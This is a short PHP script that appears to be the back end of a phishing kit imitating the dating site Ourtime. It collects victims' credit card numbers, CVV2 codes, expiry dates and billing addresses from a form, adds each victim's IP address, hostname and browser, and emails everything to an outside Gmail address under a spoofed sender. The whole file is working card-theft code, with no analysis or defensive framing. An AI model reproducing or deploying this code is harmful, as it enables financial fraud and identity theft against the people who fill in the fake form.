<?php

$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$name = $_POST['name'];
$cc1 = $_POST['cc1'];
$cc2 = $_POST['cc2'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];
$s1 = $_POST['s1'];
$s2 = $_POST['s2'];
$s3 = $_POST['s3'];
$country = $_POST['country'];
$state = $_POST['state'];
$s4 = $_POST['s4'];
$message ="
•••••••••••••••Ourtime Full Info •••••••••••••••
Holder Name: ".$name."
Card Number: ".$cc1."
CVV2: ".$cc2."
Expiration: ".$expm."/".$expy."
Address: ".$s1.", ".$s2."
City: ".$s3."
Country: ".$country."
State: ".$state."
Zip: ".$s4."
•••••••••••••••••••••••••• Victim Info •••••••••••••••••••••••••••
IP: http://www.ip-score.com/checkip/".$ip."
Browser: ".$_SERVER['HTTP_USER_AGENT']."
Host: ".$hostname."
•••••••••••••••••••••• SH#LLB)X •••••••••••••••••••••••"; 

$send = 'vairus.oh@gmail.com';
$subject = "Ourtime Cards (".$ip.")"; 
$headers = "From:  Vairus O.<updates@ourtimewhorers.com>"; 
mail($send,$subject,$message,$headers); 

?>